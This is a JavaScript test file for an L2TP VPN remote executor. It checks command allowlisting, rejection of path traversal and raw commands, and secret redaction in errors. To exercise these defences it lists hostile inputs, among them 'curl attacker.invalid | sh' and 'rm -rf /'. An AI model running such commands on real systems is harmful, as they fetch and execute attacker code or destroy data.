'use strict';

const assert = require('node:assert/strict');
const test = require('node:test');

const { L2tpRemoteExecutor } = require('../services/l2tpRemoteExecutor');
const { INSTALL_STEP_TYPES } = require('../services/l2tpProvisionPlanService');

function createTransport() {
    const calls = [];

    return {
        calls,
        async uploadRootFile(request) {
            calls.push({ method: 'uploadRootFile', request });
            return { stdout: 'transport output must stay private' };
        },
        async runArtifactCommand(request) {
            calls.push({ method: 'runArtifactCommand', request });
            return { stdout: 'remote output must stay private' };
        },
    };
}

test('preflight uploads its root-only desired file before its fixed command', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });
    const secret = 'vpn-psk-must-not-leak';

    const result = await executor.executeStep({
        operation: { id: 'operation-17' },
        step: {
            type: 'preflight',
            artifacts: [{
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({ clientCidr: '10.77.0.0/24', psk: secret }),
            }],
        },
    });

    assert.deepEqual(transport.calls, [
        {
            method: 'uploadRootFile',
            request: {
                operationId: 'operation-17',
                type: 'desired',
                path: 'desired.json',
                content: JSON.stringify({ clientCidr: '10.77.0.0/24', psk: secret }),
                owner: 'root',
                group: 'root',
                mode: 0o600,
            },
        },
        {
            method: 'runArtifactCommand',
            request: {
                operationId: 'operation-17',
                command: 'preflight',
            },
        },
    ]);
    assert.deepEqual(result, {
        ok: true,
        operationId: 'operation-17',
        step: 'preflight',
    });
    assert.doesNotMatch(JSON.stringify(result), new RegExp(secret));
    assert.doesNotMatch(JSON.stringify(transport.calls[1]), new RegExp(secret));
});

test('maps every install-plan step to its same-name allowlisted command', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });

    for (const type of INSTALL_STEP_TYPES) {
        await executor.executeStep({
            operation: { id: 'operation-all-steps' },
            step: { type },
        });
    }

    assert.deepEqual(
        transport.calls,
        INSTALL_STEP_TYPES.map(command => ({
            method: 'runArtifactCommand',
            request: {
                operationId: 'operation-all-steps',
                command,
            },
        })),
    );
});

test('rejects unknown step types before invoking the transport', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });

    await assert.rejects(
        executor.executeStep({
            operation: { id: 'operation-unknown' },
            step: {
                type: 'run_ui_shell',
                command: 'curl attacker.invalid | sh',
                artifacts: [{
                    type: 'desired',
                    path: 'desired.json',
                    content: '{"psk":"must-not-upload"}',
                }],
            },
        }),
        error => {
            assert.equal(error.name, 'L2tpRemoteExecutorError');
            assert.equal(error.code, 'UNKNOWN_STEP_TYPE');
            assert.equal(error.message, 'Unsupported L2TP operation step');
            assert.doesNotMatch(JSON.stringify(error), /run_ui_shell|curl|must-not-upload/);
            return true;
        },
    );
    assert.deepEqual(transport.calls, []);
});

test('rejects artifact path traversal before upload or command execution', async () => {
    const traversalPaths = [
        '../desired.json',
        'staging/../desired.json',
        '/desired.json',
        String.raw`staging\..\desired.json`,
    ];

    for (const path of traversalPaths) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-safe' },
                step: {
                    type: 'preflight',
                    artifacts: [{ type: 'desired', path, content: '{}' }],
                },
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'PATH_TRAVERSAL_NOT_ALLOWED');
                assert.equal(error.message, 'Artifact path traversal is not allowed');
                assert.equal(Object.hasOwn(error, 'path'), false);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('rejects artifacts outside the typed step and filename allowlist', async () => {
    const invalidCases = [
        {
            step: 'preflight',
            artifact: { type: 'shell', path: 'desired.json', content: 'id' },
        },
        {
            step: 'preflight',
            artifact: { type: 'desired', path: 'ui-command.sh', content: 'id' },
        },
        {
            step: 'backup',
            artifact: { type: 'desired', path: 'desired.json', content: '{}' },
        },
    ];

    for (const { step, artifact } of invalidCases) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-artifact-allowlist' },
                step: { type: step, artifacts: [artifact] },
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'ARTIFACT_NOT_ALLOWED');
                assert.equal(error.message, 'Artifact is not allowed for this L2TP operation step');
                assert.doesNotMatch(JSON.stringify(error), /ui-command|\bid\b/);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('rejects caller-supplied raw commands and argv even for an allowed step', async () => {
    const rawInputs = [
        { command: 'curl attacker.invalid | sh' },
        { argv: ['--password', 'ui-secret'] },
        { shell: 'rm -rf /' },
    ];

    for (const rawInput of rawInputs) {
        const transport = createTransport();
        const executor = new L2tpRemoteExecutor({ transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-no-shell' },
                step: { type: 'preflight', ...rawInput },
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, 'RAW_COMMAND_NOT_ALLOWED');
                assert.equal(error.message, 'Raw commands are not accepted by the L2TP executor');
                assert.doesNotMatch(JSON.stringify(error), /attacker|ui-secret|rm -rf/);
                return true;
            },
        );
        assert.deepEqual(transport.calls, []);
    }
});

test('rollback issues exactly one typed fixed command without failure details or secrets', async () => {
    const transport = createTransport();
    const executor = new L2tpRemoteExecutor({ transport });
    const secret = 'rollback-error-secret';

    const result = await executor.rollback({
        operation: { id: 'operation-rollback' },
        completedSteps: [{ type: 'backup' }, { type: 'stage_managed_files' }],
        failedStep: { type: 'start_l2tp' },
        error: new Error(`remote failed with ${secret}`),
    });

    assert.deepEqual(transport.calls, [{
        method: 'runArtifactCommand',
        request: {
            operationId: 'operation-rollback',
            command: 'rollback',
        },
    }]);
    assert.deepEqual(result, {
        ok: true,
        operationId: 'operation-rollback',
        step: 'rollback',
    });
    assert.doesNotMatch(JSON.stringify({ calls: transport.calls, result }), new RegExp(secret));
});

test('sanitizes upload and command transport failures before returning them', async () => {
    const secret = 'transport-failure-secret';
    const cases = [
        {
            expectedCode: 'REMOTE_UPLOAD_FAILED',
            expectedMessage: 'Failed to upload an L2TP operation artifact',
            transport: {
                async uploadRootFile() { throw new Error(`upload leaked ${secret}`); },
                async runArtifactCommand() { throw new Error('must not run'); },
            },
            step: {
                type: 'preflight',
                artifacts: [{
                    type: 'desired',
                    path: 'desired.json',
                    content: JSON.stringify({ psk: secret }),
                }],
            },
        },
        {
            expectedCode: 'REMOTE_COMMAND_FAILED',
            expectedMessage: 'Failed to run an L2TP artifact command',
            transport: {
                async uploadRootFile() {},
                async runArtifactCommand() { throw new Error(`command leaked ${secret}`); },
            },
            step: { type: 'verify' },
        },
    ];

    for (const testCase of cases) {
        const executor = new L2tpRemoteExecutor({ transport: testCase.transport });

        await assert.rejects(
            executor.executeStep({
                operation: { id: 'operation-transport-failure' },
                step: testCase.step,
            }),
            error => {
                assert.equal(error.name, 'L2tpRemoteExecutorError');
                assert.equal(error.code, testCase.expectedCode);
                assert.equal(error.message, testCase.expectedMessage);
                assert.equal(Object.hasOwn(error, 'cause'), false);
                assert.doesNotMatch(JSON.stringify(error), new RegExp(secret));
                return true;
            },
        );
    }
});
